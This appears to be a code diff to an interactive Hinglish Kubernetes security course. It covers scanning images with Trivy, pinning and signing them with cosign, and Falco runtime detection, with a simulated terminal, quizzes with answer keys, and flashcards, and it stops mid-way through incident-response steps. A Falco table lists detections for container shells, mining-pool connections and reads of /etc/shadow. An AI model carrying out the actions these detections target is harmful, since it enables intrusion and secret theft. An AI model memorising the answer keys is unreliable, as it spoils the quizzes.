@@ -307,7 +307,7 @@ kubectl auth can-i get secrets \\
           q: '"list secrets aur get secret (ek naam ka) mein security ke lihaaz se kya farak hai?"',
           choices: [
             'Koi farak nahi — dono sirf Secret ka naam dikhate hain, maal nahi',
-            'list zyada surakshit hai kyunki list mein data base64 mein hota hai',
+            'list zyada surakshit hai kyunki list ke jawab mein data base64 mein hota hai',
             'get ek Secret tak seemit ho sakta hai; list saare Secrets ka poora maal deta hai',
             'get ke liye token chahiye, list bina token ke bhi chalta hai',
           ],
@@ -588,6 +588,772 @@ kubectl get policyreport -A          # Audit ke nateeje</pre>`,
       { front: 'Nayi policy laane ka surakshit kram?', back: 'Audit → report padho → violators theek → Enforce.' },
       { front: 'Mutate aur validate mein pehle kaun?', back: 'Mutate pehle, validate baad mein — validate request ke aakhri roop ko jaanchta hai.' },
       { front: 'Bina kuch install kiye Kubernetes mein policy?', back: '<b>ValidatingAdmissionPolicy</b> + Binding (v1.30 se stable). Niyam CEL bhasha mein.' },
+    ],
+  },
+]);
+
+/* ------------------------------------------------------------------ */
+/* LEVEL 3 — image supply chain                                        */
+/* ------------------------------------------------------------------ */
+VISUALS['sec-supply'] = {
+  t: 'Image ka safar — code se cluster tak, har padav par ek jaanch',
+  scene: {
+    intro: '<b>Sawal:</b> tumhe kaise pata ki jo image cluster mein chal rahi hai, woh wahi hai jo tumhari team ne banayi thi — aur usme koi jaani-pehchaani kamzori nahi hai?',
+    aria: 'image supply chain: build, scan, sign, registry, admission verify, cluster — 6 kadam',
+    nodes: [
+      { id: 'ci', col: 0, row: 0, icon: '🏗️', label: 'CI: build', sub: 'code → image', about: 'CI pipeline code se container image banati hai. Image ke andar tumhara code + base image + libraries hoti hain.' },
+      { id: 'scan', col: 1, row: 0, icon: '🔬', label: 'Scan (Trivy)', sub: 'jaani hui kamzoriyan', tone: 'gold', about: 'Trivy image ke har package ko jaani hui kamzoriyon (CVE) ki list se milata hai. CRITICAL mile toh pipeline rok do.' },
+      { id: 'sign', col: 2, row: 0, icon: '✍️', label: 'Sign (cosign)', sub: 'digest par signature', tone: 'accent', about: 'cosign image ke <b>digest</b> par tumhari private key se signature banata hai. Signature registry mein image ke saath rakha jaata hai.' },
+      { id: 'reg', col: 2, row: 1, icon: '🏬', label: 'Registry', sub: 'image + signature', about: 'Images ka godown. Tag (jaise 4.0.1) ek chit hai jo badli ja sakti hai. Digest (sha256:…) image ke maal ka fingerprint hai — badal nahi sakta.' },
+      { id: 'adm', col: 1, row: 1, icon: '🛂', label: 'Admission: verify', sub: 'signature hai?', tone: 'gold', about: 'Cluster ke darwaze par policy: "sirf woh image chalegi jis par hamari key ka signature hai".' },
+      { id: 'k8s', col: 0, row: 1, icon: '☸️', label: 'Cluster', sub: 'pod chalta hai', tone: 'good' },
+    ],
+    steps: [
+      { from: 'ci', to: 'scan', label: 'nayi image', say: '<b>CI: build</b> image banata hai. Push se pehle image <b>Scan (Trivy)</b> ke paas jaati hai.' },
+      { at: ['scan'], say: '<b>Scan (Trivy)</b> image ke har package ko jaanchta hai. CRITICAL kamzori mili aur uska fix maujood hai → pipeline yahin ruk jaati hai. Kharab image aage badhti hi nahi.' },
+      { from: 'scan', to: 'sign', label: 'saaf hai', tone: 'good', say: 'Scan paas hua. Ab <b>Sign (cosign)</b> image ke <b>digest</b> par signature banata hai. Signature kehta hai: "yeh image ChaiPay ki pipeline se nikli hai".' },
+      { from: 'sign', to: 'reg', label: 'image + signature', say: 'Image aur signature dono <b>Registry</b> mein jaate hain. Tag <code>4.0.1</code> ek chit hai; asli pehchaan digest <code>sha256:9f2c…</code> hai.' },
+      { from: 'reg', to: 'adm', label: 'pod maang raha hai', tone: 'gold', say: 'Koi Deployment is image ko maangta hai. <b>Admission: verify</b> registry se signature mangwata hai aur tumhari public key se milata hai.' },
+      { from: 'adm', to: 'k8s', label: 'signature sahi', tone: 'good', say: 'Signature sahi hai, toh pod <b>Cluster</b> mein chalta hai. Bina signature wali image — chahe kisi ne registry mein chupke se daal di ho — darwaze par hi ruk jaati hai.' },
+    ],
+  },
+};
+
+const IMG_OLD = 'chaipay/pay-api:4.0.1', IMG_NEW = 'chaipay/pay-api:4.0.1-slim';
+const DIG = 'sha256:9f2c41d7', DIG_FULL = 'sha256:9f2c41d7a8e3b6f05c1d2e4a7b9c0d3e5f6a1b2c3d4e5f60718293a4b5c6d7e8';
+const T_SUPPLY = [
+  { text: `Purani image scan karo: <code>trivy image ${IMG_OLD}</code>`, check: s => !!s.cluster.scannedOld },
+  { text: `Nayi slim image scan karo: <code>trivy image ${IMG_NEW}</code>`, check: s => !!s.cluster.scannedNew },
+  { text: `Nayi image ka digest nikaalo: <code>crane digest ${IMG_NEW}</code>`, check: s => s.history.some(h => /^crane digest chaipay\/pay-api:4\.0\.1-slim$/.test(h)) },
+  { text: 'Image ko <b>digest</b> se sign karo (<code>cosign sign --key cosign.key chaipay/pay-api@sha256:…</code>)', check: s => !!s.cluster.signed },
+  { text: 'Signature jaancho (<code>cosign verify --key cosign.pub …</code>)', check: s => !!s.cluster.sigOk },
+  { text: 'Digest wala Deployment apply karo', check: s => !!s.cluster.deployed },
+];
+const trivyOld = `${IMG_OLD} (debian 12.9)\n\nTotal: 7 (HIGH: 5, CRITICAL: 2)\n\n┌──────────┬──────────────────┬──────────┬───────────────────┬───────────────┐\n│ Library  │ Vulnerability    │ Severity │ Installed Version │ Fixed Version │\n├──────────┼──────────────────┼──────────┼───────────────────┼───────────────┤\n│ libssl3  │ CVE-2026-A (misaal) │ CRITICAL │ 3.0.15-1          │ 3.0.17-1      │\n│ zlib1g   │ CVE-2026-B (misaal) │ CRITICAL │ 1:1.2.13          │ 1:1.2.13+deb1 │\n│ libc6    │ CVE-2026-C (misaal) │ HIGH     │ 2.36-9            │ 2.36-9+deb12  │\n│ ...      │ (4 aur HIGH)        │          │                   │               │\n└──────────┴──────────────────┴──────────┴───────────────────┴───────────────┘\n(dhyaan do: saari kamzoriyan pay-api ke code mein nahi, BASE image (debian) ke packages mein hain.\n pay-api in packages ko use bhi nahi karta — par attacker kar sakta hai.)`;
+const trivyNew = `${IMG_NEW} (distroless)\n\nTotal: 0 (HIGH: 0, CRITICAL: 0)\n(base image distroless hai: usme shell, package manager aur zyadatar system libraries hain hi nahi.\n Jo cheez image mein nahi hai, usme kamzori bhi nahi nikal sakti.)`;
+
+/* ------------------------------------------------------------------ */
+/* LEVEL 4 — runtime detection + incident response                     */
+/* ------------------------------------------------------------------ */
+VISUALS['sec-runtime'] = {
+  t: 'Falco — container ke andar kya ho raha hai, kernel se sunna',
+  scene: {
+    intro: '<b>Sawal:</b> pod <code>Running</code> hai, probes paas hain, par andar ek attacker crypto miner chala raha hai. Kubernetes ko kuch nahi dikhta. Kaun dekhega?',
+    aria: 'Falco ka raasta: container ka syscall, kernel, Falco, rules, alert, on-call — 6 kadam',
+    nodes: [
+      { id: 'ctr', col: 0, row: 0, icon: '📦', label: 'container: notify', sub: 'andar attacker', tone: 'bad', about: 'Container jo bhi karta hai — file kholna, network connection, naya process — sab Linux kernel se maang kar karta hai.' },
+      { id: 'kern', col: 1, row: 0, icon: '🐧', label: 'Linux kernel', sub: 'har kaam yahin se', about: 'Container kernel se har kaam "syscall" ke zariye maangta hai. Jaise naya process chalana = <code>execve</code>.' },
+      { id: 'falco', col: 2, row: 0, icon: '🦅', label: 'Falco', sub: 'syscalls sunta hai', tone: 'accent', about: 'Falco har node par chalta hai (DaemonSet). Falco eBPF se kernel ke syscalls sunta hai — container ko pata bhi nahi chalta.' },
+      { id: 'rules', col: 2, row: 1, icon: '📋', label: 'Rules', sub: '"container mein shell"', tone: 'gold', about: 'Niyam jo batate hain kya ajeeb hai: container mein shell khulna, /etc mein likhna, mining pool ke port par connection.' },
+      { id: 'alert', col: 1, row: 1, icon: '📟', label: 'Alert', sub: 'Slack / pager', tone: 'bad' },
+      { id: 'you', col: 0, row: 1, icon: '🧑‍🚒', label: 'On-call (tum)', sub: 'jawab dena hai', about: 'Falco sirf batata hai. Rokna aur saaf karna insaan (ya automation) ka kaam hai.' },
+    ],
+    steps: [
+      { from: 'ctr', to: 'kern', label: 'execve("sh")', tone: 'bad', say: 'Attacker <b>container: notify</b> ke andar ek shell chalata hai. Shell chalana bhi ek syscall hai: container <b>Linux kernel</b> se kehta hai "yeh naya process chalao".' },
+      { from: 'kern', to: 'falco', label: 'syscall ki khabar', say: '<b>Falco</b> eBPF ke zariye <b>Linux kernel</b> ke har syscall ki khabar sunta hai. Container ke andar kuch install nahi hai; attacker Falco ko dekh ya band nahi kar sakta.' },
+      { from: 'falco', to: 'rules', label: 'niyam se milao', tone: 'gold', say: '<b>Falco</b> is khabar ko <b>Rules</b> se milata hai. Niyam: "production container ke andar shell nahi khulna chahiye". Match ho gaya.' },
+      { from: 'falco', to: 'alert', label: 'alert', tone: 'bad', bend: -30, say: '<b>Falco</b> ek <b>Alert</b> bhejta hai: kaun sa pod, kaun sa container, kaun sa command, kis samay.' },
+      { from: 'alert', to: 'you', label: 'page', tone: 'bad', say: '<b>On-call (tum)</b> ko page milta hai. Falco ka kaam yahin khatam.' },
+      { at: ['falco', 'you'], say: 'Dhyaan do: <b>Falco</b> sirf <b>batata</b> hai, rokta nahi. Rokna do jagah hota hai: pehle (admission policy, least privilege) aur baad mein (tumhara jawab: alag karo → saboot → raaz badlo → wajah band karo).' },
+    ],
+  },
+};
+
+KG.registerLevels('secure', [
+  /* ================================================================== */
+  {
+    id: 'sec-supply',
+    icon: '📦',
+    title: 'Image Supply Chain — scan, sign, aur tag nahi digest',
+    badge: 'Image Inspector',
+    objectives: [
+      'Image ke andar tumhare code se zyada <b>doosron ka</b> maal hota hai',
+      '<b>Scan</b>: jaani hui kamzoriyan pakadna (Trivy), aur CI mein rokna',
+      '<b>Tag</b> badal sakta hai, <b>digest</b> nahi',
+      '<b>Sign + verify</b>: cluster sirf apni pipeline ki image chalaye (terminal)',
+    ],
+    lesson: [
+      `<h3>🥫 Misaal: dibbe ka khana</h3>
+       <p>Tum ek restaurant chalate ho. Tumhari recipe tumhari hai — par tel, masale, aata <b>bahar se</b> aate hain.
+       Kisi ek cheez mein milawat hui toh poora khana kharab.</p>
+       <p>Container image bhi aisi hi hai:</p>
+       <pre>tumhara code            ~5%
+tumhari libraries       ~25%
+base image (debian…)    ~70%   ← yeh tumne likha hi nahi</pre>
+       <p><b>Teen khatre:</b></p>
+       <ul>
+         <li>Base image ya library mein <b>jaani hui kamzori</b> (CVE) hai.</li>
+         <li>Tag wahi hai, par peeche ki image <b>badal</b> di gayi.</li>
+         <li>Koi <b>bahar ki image</b> cluster mein chala deta hai.</li>
+       </ul>
+       <p>Har khatre ka ek jawab hai: <b>scan</b>, <b>digest</b>, <b>signature</b>.</p>`,
+      `<h3>🔬 Scan + 🏷️ digest</h3>
+       <pre>trivy image chaipay/pay-api:4.0.1
+# CI mein darwaza: CRITICAL ya HIGH (jiska fix hai) mile toh pipeline fail
+trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 IMAGE</pre>
+       <p><b>Sabse sasta ilaaj:</b> chhoti base image (distroless / slim). Jo package image mein nahi hai, usme kamzori nahi nikal sakti.</p>
+       <p><b>Tag vs digest:</b></p>
+       <table>
+         <tr><th></th><th>Tag</th><th>Digest</th></tr>
+         <tr><td>Dikhta kaisa hai</td><td><code>pay-api:4.0.1</code></td><td><code>pay-api@sha256:9f2c41d7…</code></td></tr>
+         <tr><td>Kya hai</td><td>Ek chit — koi bhi nayi image par chipka sakta hai</td><td>Image ke maal ka fingerprint</td></tr>
+         <tr><td>Badal sakta hai?</td><td>✅ haan</td><td>❌ nahi</td></tr>
+       </table>
+       <p><b>Asli baat:</b> production mein image ko <b>digest</b> se likho. Tab kal aur aaj ek hi image chalegi — pakka.</p>`,
+      `<h3>✍️ Signature: "yeh image hamari hai"</h3>
+       <pre># CI mein, scan paas hone ke baad — digest par sign
+cosign sign --key cosign.key chaipay/pay-api@sha256:9f2c41d7…
+
+# kahin bhi jaanch
+cosign verify --key cosign.pub chaipay/pay-api@sha256:9f2c41d7…</pre>
+       <p>Private key (<code>cosign.key</code>) sirf CI ke paas hoti hai. Public key (<code>cosign.pub</code>) kisi ko bhi di ja sakti hai.</p>
+       <p><b>Cluster ke darwaze par:</b> ek admission policy (Kyverno ka <code>verifyImages</code>) har image ka signature jaanchti hai.
+       Signature nahi → pod nahi.</p>
+       <p><b>SBOM</b> = image ke andar ke saare packages ki list ("samagri ki soochi"). Kal koi nayi badi kamzori nikle,
+       toh SBOM se ek minute mein pata chalta hai ki tumhari kaun-kaun si images mein woh package hai.</p>`,
+    ],
+    stages: [
+      {
+        type: 'order',
+        title: 'Surakshit pipeline ka kram banao',
+        instructions: 'Code likhne se lekar pod chalne tak — padav sahi kram mein lagao.',
+        steps: [
+          { text: 'CI code se image banata hai (chhoti base image par)', explain: 'Sab kuch yahin se shuru. Chhoti base image = kam packages = kam kamzoriyan.' },
+          { text: 'Trivy image ko scan karta hai; CRITICAL mile toh pipeline ruk jaati hai', explain: 'Scan sign se PEHLE. Kharab image par signature lagana kharab image ko "bharosemand" bana deta.' },
+          { text: 'cosign image ke digest par signature banata hai', explain: 'Signature digest par hota hai, tag par nahi — tag kal kisi aur image par ja sakta hai.' },
+          { text: 'Image aur signature registry mein push hote hain', explain: 'Signature image ke saath registry mein rehta hai, isliye koi bhi baad mein jaanch sakta hai.' },
+          { text: 'Deployment ke YAML mein image digest se likhi jaati hai', explain: 'Ab YAML hamesha usi ek image ki taraf ishaara karta hai jo scan aur sign hui thi.' },
+          { text: 'Admission policy signature jaanchti hai, phir pod chalta hai', explain: 'Aakhri darwaza. Pipeline ke bahar se aayi image yahan ruk jaati hai.' },
+        ],
+      },
+      {
+        type: 'terminal',
+        title: '🖥️ Mission: release ka darwaza',
+        instructions: 'pay-api 4.0.1 release hona hai. Security scan mein purani image fail ho gayi. Team ne ek slim image banayi hai. Use release-layak banao.',
+        goal: `Cluster mein ek policy hai: <b>sirf ChaiPay ki key se sign hui image chalegi</b>. Purani aur nayi image scan karo, nayi image ko <b>digest se</b> sign karo, signature jaancho, aur digest wala Deployment apply karo.<br>
+          (Simulator mein digest ke pehle 8 akshar kaafi hain: <code>chaipay/pay-api@${DIG}</code>. Asli digest 64 akshar ka hota hai.)`,
+        tasks: T_SUPPLY,
+        cluster: {
+          nodes: [{ name: 'node-1', status: 'Ready', roles: '<none>', age: '40d', version: 'v1.33.4' }],
+          pods: [{ name: 'pay-api-6b8d7c-a1', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.20' }],
+          deployments: [{ name: 'pay-api', ready: '1/1', upToDate: 1, available: 1, age: '40d' }],
+          custom: {
+            clusterpolicy: { names: ['clusterpolicy', 'clusterpolicies', 'cpol'], cols: ['NAME', 'ADMISSION', 'BACKGROUND', 'VALIDATE ACTION', 'READY', 'AGE'],
+              items: [{ name: 'verify-image-signature', row: ['true', 'false', 'Enforce', 'True', '30d'],
+                describe: 'Name:  verify-image-signature\nSpec:\n  Validation Failure Action:  Enforce\n  Rules:\n    Name:  check-chaipay-signature\n    Verify Images:\n      Image References:  chaipay/*\n      Attestors:  public key (cosign.pub)\n(sirf woh chaipay/* image chalegi jis par ChaiPay ki key ka signature hai)' }] },
+          },
+        },
+        responses: [
+          { re: /^trivy image( --\S+( \S+)?)* chaipay\/pay-api:4\.0\.1$/, mutate: s => { s.cluster.scannedOld = true; }, out: trivyOld },
+          { re: /^trivy image( --\S+( \S+)?)* chaipay\/pay-api:4\.0\.1-slim$/, mutate: s => { s.cluster.scannedNew = true; }, out: trivyNew },
+          { re: /^trivy\b/, err: true, out: `Is mission mein trivy ke yeh do commands chalte hain:\n  trivy image ${IMG_OLD}\n  trivy image ${IMG_NEW}` },
+          { re: /^crane digest chaipay\/pay-api:4\.0\.1-slim$/, out: DIG_FULL + '\n(yahi image ka fingerprint hai. Simulator mein pehle 8 akshar kaafi hain: ' + DIG + ')' },
+          { re: /^crane digest chaipay\/pay-api:4\.0\.1$/, out: 'sha256:1b7e09c4f2a6d8e3b5c7091a2d4f6e8b0c1d3e5f7a9b2c4d6e8f0a1b3c5d7e9f\n(yeh PURANI image ka digest hai — jisme 2 CRITICAL kamzoriyan hain. Is par sign mat karna.)' },
+          { re: /^cosign sign --key cosign\.key chaipay\/pay-api@sha256:9f2c41d7[0-9a-f]*$/, mutate: s => { s.cluster.signed = true; },
+            out: 'Enter password for private key:\nPushing signature to: index.docker.io/chaipay/pay-api\n(signature registry mein image ke saath rakh diya gaya)' },
+          { re: /^cosign sign --key cosign\.key chaipay\/pay-api:\S+$/, err: true,
+            out: 'WARNING: Image reference uses a tag, not a digest, to identify the image to sign.\n    This can lead you to sign a different image than the intended one. Please use a\n    digest (example.com/ubuntu@sha256:abc123...) rather than tag (example.com/ubuntu:latest).\n(simulator ne roka: tag kal kisi aur image par ja sakta hai. Digest se sign karo: chaipay/pay-api@' + DIG + ')' },
+          { re: /^cosign sign\b/, err: true, out: 'Roop: cosign sign --key cosign.key chaipay/pay-api@' + DIG + '\n(digest galat ho toh: crane digest ' + IMG_NEW + ')' },
+          { re: /^cosign verify --key cosign\.pub chaipay\/pay-api(@sha256:9f2c41d7[0-9a-f]*|:4\.0\.1-slim)$/, mutate: s => { if (s.cluster.signed) s.cluster.sigOk = true; },
+            out: s => s.cluster.signed
+              ? 'Verification for index.docker.io/chaipay/pay-api@' + DIG_FULL + ' --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - The signatures were verified against the specified public key\n(signature sahi hai: yeh image ChaiPay ki key se sign hui hai)'
+              : 'Error: no matching signatures: no signatures found\n(is image par abhi koi signature nahi hai. Cluster ki policy is image ko chalne nahi degi.)' },
+          { re: /^cosign verify --key cosign\.pub chaipay\/pay-api:4\.0\.1$/, out: 'Error: no matching signatures: no signatures found\n(purani image par signature nahi hai — aur hona bhi nahi chahiye: scan fail hua tha)' },
+          { re: /^cosign verify\b/, err: true, out: 'Roop: cosign verify --key cosign.pub chaipay/pay-api@' + DIG },
+          { re: /^(cosign|crane)\b/, err: true, out: 'Is mission mein: crane digest IMAGE · cosign sign --key cosign.key IMAGE@DIGEST · cosign verify --key cosign.pub IMAGE@DIGEST' },
+        ],
+        files: {
+          'pay-api-digest.yaml': {
+            desc: 'pay-api ka Deployment — image digest se likhi hai (slim image)',
+            content: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pay-api\n  namespace: payments\nspec:\n  template:\n    spec:\n      containers:\n        - name: pay-api\n          image: chaipay/pay-api@' + DIG_FULL + '\n          # tag nahi — digest. Yeh line hamesha isi ek image ko chalayegi.',
+            apply: s => {
+              const c = s.cluster;
+              if (!c.signed) return 'Error from server: admission webhook "mutate.kyverno.svc-fail" denied the request:\n\nresource Deployment/payments/pay-api was blocked due to the following policies\n\nverify-image-signature:\n  check-chaipay-signature: \'failed to verify image index.docker.io/chaipay/pay-api@' + DIG + '…: .attestors[0].entries[0].keys: no signatures found\'\n(policy ne roka: image par signature nahi hai. Pehle cosign sign.)';
+              if (c.deployed) return 'deployment.apps/pay-api unchanged';
+              c.deployed = true;
+              c.pods = [{ name: 'pay-api-9a8b7c-s1', ready: '1/1', status: 'Running', restarts: 0, age: '15s', node: 'node-1', ip: '10.244.1.41' }];
+              return 'deployment.apps/pay-api configured\n(policy ne signature jaancha → sahi. Naya pod slim image par Running hai.)';
+            },
+          },
+          'pay-api-old-tag.yaml': {
+            desc: 'pay-api ka Deployment — image: chaipay/pay-api:4.0.1 (purani debian wali)',
+            apply: () => 'Error from server: admission webhook "mutate.kyverno.svc-fail" denied the request:\n\nresource Deployment/payments/pay-api was blocked due to the following policies\n\nverify-image-signature:\n  check-chaipay-signature: \'failed to verify image index.docker.io/chaipay/pay-api:4.0.1: no signatures found\'\n(purani image par signature nahi hai, isliye policy ne roka. Aur achha hua: is image mein 2 CRITICAL kamzoriyan hain.)',
+          },
+          'cosign.pub': { desc: 'ChaiPay ki public key (signature jaanchne ke liye)', content: '-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE…(misaal)…\n-----END PUBLIC KEY-----',
+            apply: () => 'error: yeh ek key file hai, Kubernetes manifest nahi. Iska istemal: cosign verify --key cosign.pub IMAGE' },
+        },
+        success: KG.allOf(T_SUPPLY),
+        successText: `Teen khatre, teen jawab: <b>scan</b> ne purani image ki 2 CRITICAL kamzoriyan pakdi (sab base image mein). <b>Digest</b> ne pakka kiya ki sign aur deploy ek hi image par hue. <b>Signature</b> ne cluster ke darwaze par saabit kiya ki image ChaiPay ki pipeline se aayi hai.
+          <b>Yaad rakho:</b> kram scan → sign hai. Sign → scan nahi. Signature ka matlab "yeh image jaanchi hui hai" tabhi hai jab jaanch pehle hui ho.`,
+        hints: [
+          `trivy image ${IMG_OLD} aur trivy image ${IMG_NEW} — dono ke "Total" milao.`,
+          `crane digest ${IMG_NEW} se digest nikaalo. Phir: cosign sign --key cosign.key chaipay/pay-api@${DIG}`,
+          `cosign verify --key cosign.pub chaipay/pay-api@${DIG}, phir kubectl apply -f pay-api-digest.yaml`,
+        ],
+        solution: [
+          `trivy image ${IMG_OLD}`,
+          `trivy image ${IMG_NEW}`,
+          `crane digest ${IMG_NEW}`,
+          `cosign sign --key cosign.key chaipay/pay-api@${DIG}`,
+          `cosign verify --key cosign.pub chaipay/pay-api@${DIG}`,
+          'kubectl apply -f pay-api-digest.yaml',
+        ],
+      },
+      {
+        type: 'quiz',
+        title: 'Pakka karo — tag, digest, SBOM',
+        questions: [
+          {
+            q: 'Deployment mein image: chaipay/notify:2.3 likha hai. Kal kisi ne registry mein 2.3 tag ko ek nayi image par chipka diya. Agle pod restart par kya chalega?',
+            choices: [
+              'Purani image — Kubernetes tag ko pehli baar ke digest se yaad rakhta hai',
+              'Nayi image — registry mein tag ab nayi image ki taraf ishaara karta hai',
+              'Kuch nahi — Kubernetes badle hue tag ko pehchaan kar pod rok deta hai',
+              'Dono — aadhe pods purani image par aur aadhe nayi par, hamesha ke liye',
+            ],
+            answer: 1,
+            explain: 'Tag sirf ek chit hai. Naya node (ya imagePullPolicy: Always) tag ko dobara registry se poochhta hai aur nayi image le aata hai. Isi liye ek hi Deployment ke pods alag-alag code chala sakte hain. Digest se likhne par yeh mumkin nahi.',
+          },
+          {
+            q: 'Kal ek nayi badi kamzori ka elaan hota hai: library "libxyz" ke version 2.1 se 2.4 mein. Tumhari 140 images hain. Sabse tez tareeka yeh jaanne ka ki kaun si images mein woh library hai?',
+            choices: [
+              'Har image ko ek-ek karke chala kar andar dekhna',
+              'Har team ko email karke poochhna ki unki image mein libxyz hai ya nahi',
+              'Har image ke SBOM (packages ki list) mein libxyz ko search karna',
+              'Saari 140 images ko dobara build kar dena, zaroorat ho ya na ho',
+            ],
+            answer: 2,
+            explain: 'SBOM = image ke andar ke saare packages aur versions ki list, build ke waqt bani hui. Nayi kamzori par sawal "kahan-kahan hai?" ka jawab SBOM search se minuton mein milta hai. Bina SBOM ke 140 images dobara scan karni padti hain.',
+          },
+        ],
+      },
+    ],
+    interview: {
+      title: 'Interview Round — supply chain',
+      instructions: 'Pichhle kuch saalon ke bade hamle isi raaste se hue, isliye yeh sawal aam hai. 🎤',
+      questions: [
+        {
+          q: '"Production mein image ko tag se likhna chahiye ya digest se? Kyun?"',
+          choices: [
+            'Tag se — tag padhne mein aasaan hai aur Kubernetes tag ko khud lock kar deta hai',
+            'Digest se — tag kisi bhi nayi image par ja sakta hai; digest hamesha ek hi image hai',
+            'latest tag se — taaki har restart par sabse nayi security patch apne aap aa jaye',
+            'Farak nahi padta — dono registry mein ek hi cheez ke do naam hain',
+          ],
+          answer: 1,
+          explain: 'Digest image ke maal ka hash hai. Digest se likhne par: jo scan hua, jo sign hua aur jo chal raha hai — teeno pakka ek hi image hain. Aur rollback mein pata hota hai ki kaun sa maal wapas aa raha hai.',
+        },
+        {
+          q: '"Image signing se kya milta hai jo scanning se nahi milta?"',
+          choices: [
+            'Signing image ko chhota kar deti hai, jisse pull tez hota hai',
+            'Signing image ki kamzoriyon ko apne aap patch kar deti hai',
+            'Signing saabit karti hai ki image tumhari pipeline se aayi hai aur raaste mein badli nahi',
+            'Signing ke baad scan ki zaroorat nahi rehti kyunki signed image hamesha surakshit hoti hai',
+          ],
+          answer: 2,
+          explain: 'Scan batata hai "is image mein kya kamzori hai". Signature batata hai "yeh image kahan se aayi aur badli nahi". Dono alag sawal hain. Signed image mein bhi kamzori ho sakti hai — isliye kram scan → sign.',
+        },
+        {
+          q: '"Trivy ne 40 kamzoriyan dikhayi. Sab ko aaj hi theek karna mumkin nahi. Kaise chunoge?"',
+          choices: [
+            'CVE number ke kram mein, sabse purani pehle',
+            'Jinka fix maujood hai aur severity CRITICAL/HIGH hai, unhe pehle',
+            'Sab ko nazarandaz karunga jab tak koi hamla na ho',
+            'Sirf apne code ki kamzoriyan; base image ki kamzoriyan meri zimmedari nahi',
+          ],
+          answer: 1,
+          explain: 'Do filter: severity (CRITICAL/HIGH) aur fix maujood hai ya nahi (--ignore-unfixed). Jiska fix hi nahi, us par aaj kuch nahi ho sakta. Aur sabse bada asar base image badalne se aata hai: slim/distroless par aksar 80–90% kamzoriyan gayab ho jaati hain.',
+        },
+      ],
+    },
+    success: [
+      'Main Trivy ka output padh kar bata sakta hoon ki kamzori kahan hai aur kise pehle theek karna hai',
+      'Main tag aur digest ka farak samjha sakta hoon',
+      'Main image ko digest se sign aur verify kar sakta hoon',
+    ],
+    homework: `<p>Apne laptop par (Trivy install ho toh) apni kisi image ko scan karo:</p>
+      <pre>trivy image --severity HIGH,CRITICAL --ignore-unfixed &lt;image&gt;
+trivy image --format cyclonedx -o sbom.json &lt;image&gt;      # SBOM
+kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\\n"}{end}' | sort -u
+# upar ki list mein kitni images tag se hain, kitni digest se?</pre>`,
+    cards: [
+      { front: 'Tag aur digest ka farak?', back: '<b>Tag</b> (<code>:4.0.1</code>) ek chit hai jo kisi nayi image par ja sakti hai. <b>Digest</b> (<code>@sha256:…</code>) image ke maal ka fingerprint hai — badal nahi sakta.' },
+      { front: 'Pipeline mein scan aur sign ka kram?', back: 'Scan <b>pehle</b>, sign <b>baad mein</b>. Signature ka matlab "jaanchi hui image" tabhi hai jab jaanch pehle hui ho.' },
+      { front: 'cosign se sign aur verify?', back: '<code>cosign sign --key cosign.key IMAGE@DIGEST</code> · <code>cosign verify --key cosign.pub IMAGE@DIGEST</code>' },
+      { front: 'Kamzoriyan ghatane ka sabse sasta tareeka?', back: 'Chhoti base image (distroless / slim). Jo package image mein nahi, usme kamzori nahi.' },
+      { front: 'SBOM kya hai aur kab kaam aata hai?', back: 'Image ke saare packages + versions ki list. Nayi kamzori nikle toh "meri kaun si images mein hai?" ka jawab minuton mein.' },
+    ],
+  },
+
+  /* ================================================================== */
+  {
+    id: 'sec-runtime',
+    icon: '🦅',
+    title: 'Runtime Security — Falco, aur compromise hue pod ka sahi jawab',
+    badge: 'Runtime Rakshak',
+    objectives: [
+      'Kubernetes ko <b>behaviour</b> nahi dikhta — sirf "container chal raha hai"',
+      'Falco: kernel ke syscalls se ajeeb harkat pakadna',
+      'Compromise hue pod ka jawab: <b>alag karo → saboot → raaz badlo → wajah band karo → hatao</b>',
+      'Falco ke alerts padhna + ghatna ke faisle sahi kram mein lena',
+    ],
+    lesson: [
+      `<h3>📹 Misaal: bank ka CCTV</h3>
+       <p>Bank ke darwaze par guard hai (admission policy). Tijori par taala hai (RBAC). Phir bhi bank <b>CCTV</b> lagata hai. Kyun?</p>
+       <p>Kyunki koi andar aa hi gaya toh guard aur taala kuch nahi batate. CCTV batata hai ki <b>andar kya ho raha hai</b>.</p>
+       <p>Kubernetes ko ek pod ke baare mein bas itna pata hota hai:</p>
+       <ul>
+         <li>Container chal raha hai? ✅</li>
+         <li>Probes paas ho rahe hain? ✅</li>
+       </ul>
+       <p>Agar attacker usi container ke andar ek crypto miner chala de, toh dono jawab ab bhi ✅ hain. Pod <code>Running</code>, <code>1/1 Ready</code>.</p>
+       <p><b>Asli baat:</b> "healthy" aur "surakshit" alag cheezein hain. Andar ki harkat dekhne ke liye alag auzaar chahiye: <b>runtime detection</b>.</p>`,
+      `<h3>🦅 Falco: kernel se sunna</h3>
+       <p>Container jo bhi kare — file kholna, network connection, naya process — kernel se <b>syscall</b> ke zariye karta hai.
+       <b>Falco</b> har node par chalta hai aur in syscalls ko sunta hai (eBPF se). Falco ke <b>rules</b> batate hain kya ajeeb hai:</p>
+       <table>
+         <tr><th>Falco ka rule</th><th>Kyun ajeeb</th></tr>
+         <tr><td>Terminal shell in container</td><td>Production container mein koi shell kyun khol raha hai?</td></tr>
+         <tr><td>Write below binary dir (<code>/usr/bin</code>…)</td><td>Chalta container naye program kyun likh raha hai?</td></tr>
+         <tr><td>Outbound connection to mining pool port</td><td>notify ko mining pool se kya kaam?</td></tr>
+         <tr><td>Read sensitive file (<code>/etc/shadow</code>)</td><td>App ko password file kyun chahiye?</td></tr>
+       </table>
+       <p>Falco sirf <b>batata</b> hai. Falco kuch rokta nahi.</p>`,
+      `<h3>🧯 Compromise hua pod: paanch kadam, isi kram mein</h3>
+       <ol>
+         <li><b>Alag karo</b> — pod ko zinda rakho, par traffic aur network se kaat do:
+           <pre>kubectl label pod POD app- quarantine=true     # Service aur ReplicaSet se bahar
+kubectl apply -f quarantine-netpol.yaml         # quarantine=true ka saara network band</pre></li>
+         <li><b>Saboot bachao</b> — logs, <code>describe</code>, pod ka YAML.</li>
